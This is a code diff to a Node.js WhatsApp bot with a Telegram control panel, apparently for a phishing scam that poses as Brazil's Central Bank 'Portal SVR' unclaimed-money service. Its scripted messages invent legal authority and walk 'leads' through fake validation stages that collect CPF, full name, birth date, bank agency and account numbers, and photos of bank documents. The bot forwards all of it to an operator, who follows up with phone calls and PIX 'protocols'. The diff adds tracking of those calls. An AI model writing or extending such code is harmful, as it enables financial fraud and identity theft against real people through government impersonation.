@@ -200,12 +200,13 @@ async function notifyTelegramPhoto(buffer, caption) {
 }
 
 // Monta o texto do painel de cadastro no Telegram (editável)
-function buildCadastroMessage(chatId, nome, dataNasc, status, tipo = 'CPF') {
+function buildCadastroMessage(chatId, nome, dataNasc, status, tipo = 'CPF', humanStep = 0, isCalling = false) {
     const statusEmoji = {
         'preenchendo_data': '⏳',
         'preenchendo_nome': '⏳',
         'validado': '✅',
-        'na_fila': '🕐'
+        'na_fila': '🕐',
+        'human': '👤'
     }[status] || '⏳';
 
     const tipoLabel = tipo === 'CNPJ' ? '🏢 Pessoa Jurídica (CNPJ)' : '👤 Pessoa Física (CPF)';
@@ -222,9 +223,14 @@ function buildCadastroMessage(chatId, nome, dataNasc, status, tipo = 'CPF') {
     else if (status === 'na_fila') {
         const pos = getQueuePosition(chatId);
         statusMsg = pos ? `🕐 <b>Na fila — Posição: ${pos}º</b>` : `🕐 <b>Na fila de processamento</b>`;
+    } else if (status === 'human') {
+        if (isCalling) statusMsg = '📞 <b>EM LIGAÇÃO AGORA... (Falando com Lead)</b>';
+        else if (humanStep === 1) statusMsg = '👤 <b>EM ATENDIMENTO (Etapa 2: PENDENTE 📵)</b>';
+        else if (humanStep === 2) statusMsg = '👤 <b>EM ATENDIMENTO (Etapa 2: CONCLUÍDA ✅)</b>';
+        else statusMsg = '👤 <b>ATENDIMENTO MANUAL ATIVO</b>';
     }
 
-    const text = `${statusEmoji} <b>NOVO CADASTRO EM ANDAMENTO</b>\n\n` +
+    const text = `${statusEmoji} <b>PAINEL DE CONTROLE DO LEAD</b>\n\n` +
         `👤 <b>Lead:</b> <code>${chatId}</code>\n` +
         `📄 <b>Tipo:</b> ${tipoLabel}\n\n` +
         `📋 <b>Dados do Titular:</b>\n` +
@@ -232,11 +238,14 @@ function buildCadastroMessage(chatId, nome, dataNasc, status, tipo = 'CPF') {
         `• ${nomeLabel}: ${nomeDisplay}\n\n` +
         `📊 <b>Status:</b> ${statusMsg}`;
 
+    const e2Label = humanStep >= 2 ? "📞 Etapa 2 ✅" : "📞 Etapa 2 (Pendente)";
+    const e3Label = humanStep >= 3 ? "🔐 Etapa 3 ✅" : "🔐 Etapa 3 (Validação)";
+
     const reply_markup = {
         inline_keyboard: [
             [
-                { text: "📞 Etapa 2 (Ligação)", callback_data: `etapa:2:${chatId}` },
-                { text: "🔐 Etapa 3 (Validação)", callback_data: `etapa:3:${chatId}` }
+                { text: e2Label, callback_data: `etapa:2:${chatId}` },
+                { text: e3Label, callback_data: `etapa:3:${chatId}` }
             ],
             [
                 { text: "💰 Gerar Protocolo PIX", callback_data: `cmd:pix:${chatId}` },
@@ -294,10 +303,28 @@ client.on('ready', async () => {
     try {
         const info = client.info;
         if (info && info.pushname) adminName = info.pushname;
-    } catch(e) {}
+    } catch (e) { }
     fs.writeFileSync(STATUS_FILE, JSON.stringify({ status: 'CONNECTED', adminName, ts: Date.now() }));
     const slotLabel = BOT_ID === 'main' ? 'PERFIL 1' : BOT_ID.toUpperCase();
     notifyTelegram(`✅ <b>${slotLabel} CONECTADO</b>\n\n📱 WhatsApp vinculado com sucesso!\nO bot está pronto para atendimento.`);
+});
+
+client.on('incoming_call', async (call) => {
+    if (BOT_ID !== 'main') return;
+    const targetChatId = call.from;
+    const currentSession = chatSessions.get(targetChatId);
+    
+    console.log(`📞 [INCOMING] Chamada de ${targetChatId}`);
+    
+    if (currentSession) {
+        currentSession.isCalling = true;
+        chatSessions.set(targetChatId, currentSession);
+        
+        if (currentSession.tgMsgId) {
+            const { text: txt, reply_markup } = buildCadastroMessage(targetChatId, currentSession.name, currentSession.birthDate, 'human', currentSession.docType, currentSession.humanStep || 1, true);
+            await notifyTelegram(txt, currentSession.tgMsgId, reply_markup);
+        }
+    }
 });
 
 client.on('disconnected', (reason) => {
@@ -348,7 +375,7 @@ _Este canal é monitorado e possui validade jurídica._`;
 
 // --- MENSAGENS POR ETAPA ---
 const MENSAGEM_ETAPA_2_CONCLUIDA =
-`🔐 *PORTAL SVR — SISTEMA DE VALORES A RECEBER*
+    `🔐 *PORTAL SVR — SISTEMA DE VALORES A RECEBER*
 *Departamento de Liberação de Ativos Financeiros*
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
@@ -371,7 +398,7 @@ Nosso operador dará continuidade ao processo em instantes. Permaneça disponív
 _Este processo possui registro jurídico e validade legal._`;
 
 const MENSAGEM_ETAPA_3 =
-`🔐 *ETAPA 3 — VALIDAÇÃO E HABILITAÇÃO DA CONTA DE DESTINO*
+    `🔐 *ETAPA 3 — VALIDAÇÃO E HABILITAÇÃO DA CONTA DE DESTINO*
 *Departamento de Segurança Financeira — Portal SVR*
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
@@ -397,7 +424,7 @@ Aguarde o envio das instruções de validação (Código Hash de Autenticação)
 _Processo regido pela Resolução BCB nº 318/2023._`;
 
 const MENSAGEM_ETAPA_4 =
-`🔐 *PROTOCOLO DE SEGURANÇA HOMOLOGADO*
+    `🔐 *PROTOCOLO DE SEGURANÇA HOMOLOGADO*
 *Departamento de Rastreamento de Ativos — SVR*
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
@@ -420,7 +447,7 @@ ${BT}
 *Portal SVR — Banco Central do Brasil*`;
 
 const MENSAGEM_ETAPA_5 =
-`✨ *PROTOCOLO FINALIZADO — RESGATE CONCLUÍDO* ✨
+    `✨ *PROTOCOLO FINALIZADO — RESGATE CONCLUÍDO* ✨
 *Departamento de Execução Financeira — Portal SVR*
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
@@ -520,18 +547,22 @@ client.on('message_create', async (msg) => {
             const callBody = (msg.body || '').toLowerCase();
             // Verifica se a ligação foi atendida (não perdida)
             const callAnswered = !callBody.includes('perdida') && !callBody.includes('missed') && !callBody.includes('sem resposta');
+            
+            if (currentSession) {
+                currentSession.isCalling = false;
+            }
+
             if (callAnswered) {
                 currentSession.humanStep = 2;
                 chatSessions.set(targetChatId, currentSession);
                 saveSessions();
                 console.log(`📞 [CALL] Ligação atendida por ${targetChatId} — Etapa 2 concluída automaticamente!`);
 
-                // Notifica Telegram com botão para liberar Etapa 3
-                await notifyTelegram(
-                    `📞 <b>LIGAÇÃO ATENDIDA — ETAPA 2 CONCLUÍDA!</b>\n\nLead: <code>${targetChatId}</code>\nNome: <b>${currentSession.name || '?'}</b>\n\n<i>Clique abaixo quando quiser liberar a Etapa 3 ao lead.</i>`,
-                    undefined,
-                    { inline_keyboard: [[{ text: '📋 Liberar Etapa 3 ao Lead', callback_data: `etapa:3:${targetChatId}` }]] }
-                );
+                // Atualiza painel principal
+                if (currentSession.tgMsgId) {
+                    const { text: txt, reply_markup } = buildCadastroMessage(targetChatId, currentSession.name, currentSession.birthDate, 'human', currentSession.docType, 2);
+                    await notifyTelegram(txt, currentSession.tgMsgId, reply_markup);
+                }
 
                 // Envia mensagem de Etapa 2 concluída ao lead
                 setTimeout(async () => {
@@ -539,7 +570,11 @@ client.on('message_create', async (msg) => {
                 }, 2000);
             } else {
                 console.log(`📵 [CALL] Ligação perdida/não atendida por ${targetChatId}.`);
-                await notifyTelegram(`📵 <b>LIGAÇÃO NÃO ATENDIDA</b>\nLead: <code>${targetChatId}</code>\n<i>Tente ligar novamente.</i>`);
+                // Edita o painel informando que a ligação falhou
+                if (currentSession.tgMsgId) {
+                    const { text: txt, reply_markup } = buildCadastroMessage(targetChatId, currentSession.name, currentSession.birthDate, 'human', currentSession.docType, 1);
+                    await notifyTelegram(txt, currentSession.tgMsgId, reply_markup);
+                }
             }
         }
         return;
@@ -560,7 +595,9 @@ client.on('message_create', async (msg) => {
         });
         saveSessions();
         console.log(`👤 [ADMIN] Assumiu atendimento de: ${targetChatId}`);
-        notifyTelegram(`👤 <b>ATENDIMENTO ASSUMIDO PELO ADMIN</b>\nLead: <code>${targetChatId}</code>\nNome: <b>${currentSession.name || '?'}</b>\n\n<i>📞 Agora ligue para o lead. A Etapa 2 será concluída automaticamente quando ele atender.</i>`);
+
+        const { text: txtAssume, reply_markup: rmAssume } = buildCadastroMessage(targetChatId, currentSession.name, currentSession.birthDate, 'human', currentSession.docType, 1);
+        await notifyTelegram(txtAssume, currentSession.tgMsgId, rmAssume);
 
         setTimeout(async () => {
             try {
@@ -653,7 +690,7 @@ async function processIncomingMessage(msg, targetChatId) {
                 } catch (e) {
                     await notifyTelegram(`📸 <b>MÍDIA BANCÁRIA RECEBIDA (Sem Imagem)</b>\nLead: <code>${targetChatId}</code>\n<i>Erro ao processar imagem, verifique o WhatsApp.</i>`);
                 }
-                
+
                 await client.sendMessage(targetChatId, `✅ *Documento recebido com sucesso.*\n\nIniciando leitura óptica dos caracteres de segurança... Por favor, aguarde a validação final.`);
                 return;
             }
@@ -661,14 +698,14 @@ async function processIncomingMessage(msg, targetChatId) {
             // Tenta identificar Agência e Conta no texto
             const agMatch = text.match(/(?:ag[êe]ncia|ag):?\s*(\d{4,5})/i);
             const ccMatch = text.match(/(?:conta|cc):?\s*(\d{5,12}[-\s]?\d)/i);
-            
+
             if (agMatch || ccMatch || (text.length >= 4 && /^\d+$/.test(text.replace(/[-\s]/g, '')))) {
                 const ag = agMatch ? agMatch[1] : (text.length <= 5 ? text : 'Pendente');
                 const cc = ccMatch ? ccMatch[1] : (text.length > 5 ? text : 'Pendente');
 
                 console.log(`🏦 [BANCO] Dados de ${targetChatId}: Ag ${ag} | Cc ${cc}`);
                 await notifyTelegram(`🏦 <b>DADOS BANCÁRIOS IDENTIFICADOS</b>\nLead: <code>${targetChatId}</code>\nAgência: <b>${ag}</b>\nConta: <b>${cc}</b>\n\n<i>Texto: ${text}</i>`);
-                
+
                 await client.sendMessage(targetChatId, `🔍 *Verificando autenticidade...*\n\nDados capturados:\n🏛️ Agência: ${ag}\n💳 Conta: ${cc}\n\nO sistema está cruzando as informações com o CPF titular para autorização do repasse final.`);
                 return;
             }
@@ -827,7 +864,7 @@ async function processIncomingMessage(msg, targetChatId) {
                 `📍 *FASE 1.2:* Agora informe seu *Nome Completo* (conforme consta no documento oficial):`);
         }
 
-    // --- ETAPA 2: NOME / RAZÃO SOCIAL ---
+        // --- ETAPA 2: NOME / RAZÃO SOCIAL ---
     } else if (currentSession.step === 2) {
         const typedName = text.trim();
 
@@ -860,7 +897,7 @@ async function processIncomingMessage(msg, targetChatId) {
             await msg.reply(aiReply || fallback);
         }
 
-    // --- ETAPA 1.3: DADOS BANCÁRIOS (Antes da fila) ---
+        // --- ETAPA 1.3: DADOS BANCÁRIOS (Antes da fila) ---
     } else if (currentSession.step === 3) {
         // Se o lead já enviou os dados e estamos aguardando o "SIM" de confirmação
         if (currentSession.awaitingConfirm) {
@@ -927,7 +964,7 @@ async function processIncomingMessage(msg, targetChatId) {
         if (typedBank.length >= 4) {
             const bank = detectBank(typedBank);
             const bankName = bank ? bank.name : "Instituição Identificada";
-            
+
             // Tenta extrair Agência e Conta
             const agMatch = typedBank.match(/(?:ag[êe]ncia|ag):?\s*(\d{4,5})/i);
             const ccMatch = typedBank.match(/(?:conta|cc):?\s*(\d{5,12}[-\s]?\d)/i);
